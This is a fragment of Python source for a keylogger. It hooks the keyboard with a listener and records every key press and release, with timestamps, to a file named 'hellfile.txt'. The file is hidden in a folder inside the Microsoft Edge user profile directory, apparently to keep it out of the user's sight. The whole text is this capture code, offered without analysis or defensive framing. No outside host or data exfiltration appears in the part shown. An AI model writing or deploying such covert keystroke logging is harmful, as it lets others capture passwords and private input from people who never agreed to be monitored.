def start_log():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
                                        "Default")
        direc = "temp"
        dir = os.path.join(local_state_path, direc)
        os.mkdir(dir)
    except:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
                                        "Default")
        direc = "temp"
        dir = os.path.join(local_state_path, direc)

    global hellfile
    hellfile = dir + "\\hellfile.txt"

    print(hellfile)
    f = open(hellfile, "w+")
    sys.stdout = f

    def on_press(key):
        try:
            f = open(hellfile, "a+")
            sys.stdout = f
            seconds = time.time()
            local_time = time.ctime(seconds)
            print(local_time, end="--------->")
            print('Alphanumeric key pressed: {0} '.format(
                key.char))
            f.close()
        except AttributeError:
            f = open(hellfile, "a+")
            sys.stdout = f
            seconds = time.time()
            local_time = time.ctime(seconds)
            print(local_time, end="--------->")
            print('special key pressed: {0}'.format(
                key))
            f.close()

    def on_release(key):
        f = open(hellfile, "a+")
        sys.stdout = f
        seconds = time.time()
        local_time = time.ctime(seconds)
        print(local_time, end="--------->")
        print('Key released: {0}'.format(
            key))
        f.close()
        if stopper == "stop":
            # Stop listener
            return False

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    f.close()
